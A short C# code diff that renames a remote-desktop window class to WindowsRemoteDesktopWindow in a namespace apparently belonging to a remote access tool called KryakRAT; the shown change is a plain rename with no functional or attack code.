@@ -10,7 +10,7 @@ using WinRT.Interop;
 
 namespace KryakRAT.Windows;
 
-public sealed partial class RemoteDesktopWindow : Window
+public sealed partial class WindowsRemoteDesktopWindow : Window
 {
     private readonly UserData _user;
     private bool _isStreaming;
@@ -18,7 +18,7 @@ public sealed partial class RemoteDesktopWindow : Window
     private int _lastFrameWidth;
     private int _lastFrameHeight;
 
-    public RemoteDesktopWindow(UserData user)
+    public WindowsRemoteDesktopWindow(UserData user)
     {
         InitializeComponent();
         _user = user;
